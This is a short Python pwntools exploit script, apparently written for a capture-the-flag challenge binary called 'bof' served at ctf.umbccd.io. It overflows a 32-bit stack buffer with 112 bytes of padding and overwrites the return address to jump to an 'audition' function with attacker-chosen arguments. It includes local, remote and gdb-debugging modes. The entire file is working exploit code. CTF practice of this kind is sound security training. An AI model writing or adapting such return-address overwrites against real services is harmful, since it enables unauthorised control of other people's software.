#!/usr/bin/env python

from pwn import *

BINARY = './bof'
LIBC = './libc.so.6'
HOST = 'ctf.umbccd.io'
PORT = 4000

elf = ELF(BINARY)

context.terminal = ['tmux', 'split-w']

def get_base_address(proc):
        return int(open("/proc/{}/maps".format(proc.pid), 'rb').readlines()[0].split('-')[0], 16)

def debug(breakpoints):
        script = ""
        for bp in breakpoints:
                script += "b *0x%x\n"%(PIE+bp)
        gdb.attach(process(BINARY), gdbscript=script)

def start():
    if not args.REMOTE:
        print("LOCAL PROCESS")
        return process(BINARY, env={"LD_PRELOAD":LIBC})
    else:
        print("REMOTE PROCESS")
        return remote(HOST, PORT)


p = start()
if args.GDB:
    gdb.attach(p, 'b audition')

audition = p32(0x8049182)
time = p32(1200)
room_num = p32(366)
ret = p32(0x804928c)

exploit = b"A"*112
exploit += audition
exploit += b"JUNK"
exploit += time
exploit += room_num

p.sendlineafter("name?\n", "A")
p.sendlineafter("singing?\n", exploit)


p.interactive()

